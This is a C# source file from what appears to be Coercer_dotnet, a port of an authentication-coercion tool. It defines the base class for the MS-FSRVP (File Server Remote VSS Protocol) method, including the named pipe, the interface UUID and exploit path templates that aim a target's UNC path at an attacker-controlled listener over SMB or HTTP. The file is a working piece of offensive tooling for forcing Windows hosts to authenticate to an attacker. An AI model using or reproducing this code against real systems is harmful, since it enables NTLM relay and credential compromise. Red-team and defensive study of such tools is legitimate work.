using Coercer_dotnet.structures;

namespace Coercer_dotnet.methods.MS_FSRVP
{
    public abstract class MS_FSRVP : Method
    {
        protected MS_FSRVP(AuthType authType, string listener) : base(authType, listener) { }
        protected MS_FSRVP(AuthType authType, string listener, int port) : base(authType, listener, port) { }
        protected MS_FSRVP(AuthType authType, string listener, int httpPort, int smbPort) : base(authType, listener, httpPort, smbPort) { }
        public override string Author => "@topotam77";
        public override ExploitPathTemplate[] ExploitPathTemplates => new ExploitPathTemplate[]
        {
            new(AuthType.SMB, "\\\\{{listener}}\x00"),
            new(AuthType.HTTP, "\\\\{{listener}}@{{port}}/{{3}}\x00")
        };
        public override NcanNpAccess[] NcanNpAccesses => new NcanNpAccess[] { new("\\PIPE\\Fssagentrpc", "a8e0653c-2744-4389-a61d-7373df8b2292", "1.0") };
        public override NcacnIpTcpAccess[] NcacnIpTcpAccesses => new NcacnIpTcpAccess[] { new("a8e0653c-2744-4389-a61d-7373df8b2292", "1.0") };
        public override Protocol Protocol => new("[MS-FSRVP]: File Server Remote VSS Protocol", "MS-FSRVP");
    }
}